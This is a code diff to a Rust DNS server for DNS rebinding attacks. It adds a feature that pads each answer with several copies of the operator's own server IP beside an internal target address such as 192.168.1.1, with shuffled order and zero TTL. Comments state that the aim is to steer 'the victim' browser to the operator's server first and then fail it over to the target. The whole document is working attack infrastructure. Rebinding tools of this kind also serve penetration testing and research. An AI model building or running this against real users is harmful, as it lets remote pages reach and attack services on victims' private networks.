@@ -31,6 +31,8 @@ use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
 use async_trait::async_trait;
 use rand::seq::SliceRandom;
 use hickory_proto::op::{Header, ResponseCode};
+
+use crate::project::Active;
 use hickory_proto::rr::rdata::{A, AAAA};
 use hickory_proto::rr::{RData, Record, RecordType};
 use hickory_server::authority::MessageResponseBuilder;
@@ -43,6 +45,19 @@ pub struct RebindHandler {
     /// TTL placed on every answer. Rebinding wants a very short cache lifetime
     /// so the victim re-resolves quickly; 0 means "do not cache".
     pub ttl: u32,
+    /// Our own (standard) server's IP. When the active project's padding count
+    /// is > 0 this address is injected alongside the decoded target(s) so the
+    /// browser sees mostly *our* IP and only occasionally the target.
+    pub server_ip: IpAddr,
+    /// The active project, read on every query for its `pad` count. Padding is
+    /// a per-project setting (configurable from the dashboard's advanced
+    /// settings), so the handler reads it live rather than capturing it at
+    /// startup. Some browsers, when handed several A records, favor whichever
+    /// the first reachable one is and only fail over once it stops responding;
+    /// returning the server IP many times next to a single target IP — e.g.
+    /// `<SERVER> <SERVER> <SERVER> <TARGET> <SERVER>` — biases the browser onto
+    /// our server first, then lets `/stop` push it over to the target.
+    pub active: Active,
 }
 
 #[async_trait]
@@ -76,8 +91,13 @@ impl RebindHandler {
         tracing::info!("query {name} type={qtype}");
 
         // Decode the matching addresses out of the name (random/base-domain
-        // labels are ignored) and turn them into records.
-        let mut records: Vec<Record> = decode_addrs(&name, qtype)
+        // labels are ignored) and pad with copies of our server IP. The pad
+        // count is read live from the active project.
+        let pad = self.active.read().unwrap().pad_clamped();
+        let addrs = answer_addrs(&name, qtype, self.server_ip, pad);
+
+        // Turn the addresses into answer records.
+        let mut records: Vec<Record> = addrs
             .into_iter()
             .map(|ip| {
                 let rdata = match ip {
@@ -90,7 +110,8 @@ impl RebindHandler {
 
         // Randomize the answer order. Some browsers/resolvers prioritize the
         // first record returned, so shuffling spreads selection across all
-        // encoded addresses (and helps flip between rebinding targets).
+        // returned addresses (and interleaves the padding server IPs with the
+        // target instead of grouping them).
         records.shuffle(&mut rand::thread_rng());
 
         if !records.is_empty() {
@@ -106,8 +127,21 @@ impl RebindHandler {
 }
 
 /// Run the DNS server (UDP + TCP) on `bind` (e.g. `0.0.0.0:53`) forever.
-pub async fn serve(bind: &str, ttl: u32) -> Result<(), Box<dyn std::error::Error>> {
-    let handler = RebindHandler { ttl };
+///
+/// `server_ip` is our standard server's address; `active` is the shared active
+/// project, whose `pad` count controls how many extra copies of `server_ip` to
+/// inject next to each decoded target.
+pub async fn serve(
+    bind: &str,
+    ttl: u32,
+    server_ip: IpAddr,
+    active: Active,
+) -> Result<(), Box<dyn std::error::Error>> {
+    let handler = RebindHandler {
+        ttl,
+        server_ip,
+        active,
+    };
     let mut server = ServerFuture::new(handler);
 
     let udp = UdpSocket::bind(bind).await?;
@@ -163,6 +197,25 @@ fn decode_addrs(name: &str, qtype: RecordType) -> Vec<IpAddr> {
         }
     }
     out
+}
+
+/// Build the full set of addresses to answer with: the targets decoded from
+/// `name`, plus `pad` extra copies of `server_ip`. Padding is only applied when
+/// at least one target was decoded and `server_ip` matches the query type
+/// (A→IPv4, AAAA→IPv6); the caller is expected to shuffle the result so the
+/// padding interleaves with the target rather than grouping at the end.
+fn answer_addrs(name: &str, qtype: RecordType, server_ip: IpAddr, pad: usize) -> Vec<IpAddr> {
+    let mut addrs = decode_addrs(name, qtype);
+    if !addrs.is_empty() && pad > 0 {
+        let server_matches = matches!(
+            (server_ip, qtype),
+            (IpAddr::V4(_), RecordType::A) | (IpAddr::V6(_), RecordType::AAAA)
+        );
+        if server_matches {
+            addrs.extend(std::iter::repeat(server_ip).take(pad));
+        }
+    }
+    addrs
 }
 
 /// Parse `a-b-c-d` (four decimal octets) into an IPv4 address.
@@ -275,6 +328,38 @@ mod tests {
         let v6 = "2001-db8-z-1.9fa2c.example.com.";
         assert_eq!(
             decode_addrs(v6, RecordType::AAAA),
+            vec![IpAddr::V6("2001:db8::1".parse().unwrap())]
+        );
+    }
+
+    #[test]
+    fn pads_with_server_ip() {
+        let server: IpAddr = "203.0.113.5".parse().unwrap();
+        let target = IpAddr::V4(Ipv4Addr::new(192, 168, 1, 1));
+        let name = "192-168-1-1.k3f9zq.example.com.";
+
+        // pad=3 → target + 3 copies of the server IP, in decode/append order
+        // (the handler shuffles afterwards).
+        let out = answer_addrs(name, RecordType::A, server, 3);
+        assert_eq!(out, vec![target, server, server, server]);
+        assert_eq!(out.iter().filter(|ip| **ip == server).count(), 3);
+
+        // pad=0 → no padding, just the decoded target(s).
+        assert_eq!(answer_addrs(name, RecordType::A, server, 0), vec![target]);
+    }
+
+    #[test]
+    fn no_pad_without_target_or_on_type_mismatch() {
+        let server_v4: IpAddr = "203.0.113.5".parse().unwrap();
+
+        // No decoded target → nothing to anchor padding to → empty answer.
+        assert!(answer_addrs("example.com.", RecordType::A, server_v4, 3).is_empty());
+
+        // IPv4 server IP must not pad an AAAA answer (type mismatch); the IPv6
+        // target is still returned alone.
+        let name = "2001-db8-z-1.example.com.";
+        assert_eq!(
+            answer_addrs(name, RecordType::AAAA, server_v4, 3),
             vec![IpAddr::V6("2001:db8::1".parse().unwrap())]
         );
     }
